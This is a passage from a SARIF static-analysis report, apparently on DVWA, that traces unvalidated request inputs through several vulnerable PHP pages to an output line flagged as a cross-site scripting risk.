              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Read $_FILES['uploaded']['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:9 - Assignment to $uploaded_name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - substr(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:10 - Assignment to $uploaded_ext"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:18 - Assignment to $target_file"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:42 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 42
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "impossible.php:3 - impossible.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/upload/source/impossible.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - impossible.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4621",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "A19BB03F5203858744E18C178285A429"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:14 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 14
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:18 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 18
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4623",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "A27F189A801CD9EA774785783596CA08"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:29 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 29
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['username']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - stripslashes(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:9 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 9
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - mysqli_real_escape_string(1 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:10 - Assignment to $user"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 10
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:28 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/source/high.php"
                },
                "region" : {
                  "startLine" : 28
                }
              }
            }
          }, {
            "location" : {
              "message" : {
